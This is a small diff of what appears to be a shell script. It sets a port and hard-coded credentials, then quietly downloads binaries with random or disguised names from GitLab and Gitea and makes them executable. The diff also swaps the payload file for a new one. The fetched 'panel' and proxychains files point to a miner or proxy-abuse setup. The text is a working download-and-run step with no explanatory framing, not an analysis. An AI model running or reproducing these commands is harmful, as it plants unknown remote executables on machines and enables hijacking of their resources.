@@ -1,7 +1,7 @@
 port="9293" 
 user="u12novuxsvzg7n"  
 pass="11hzmsrqq2lo395w7h23fc5v26" 
-wget -q -O 96dNbbLaz7 https://gitlab.com/node.js2594450/scala/-/raw/main/mxl && chmod +x 96dNbbLaz7
+wget -q -O 96dNbbLaz7 https://gitlab.com/node.js2594450/scala/-/raw/main/ixc && chmod +x 96dNbbLaz7
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
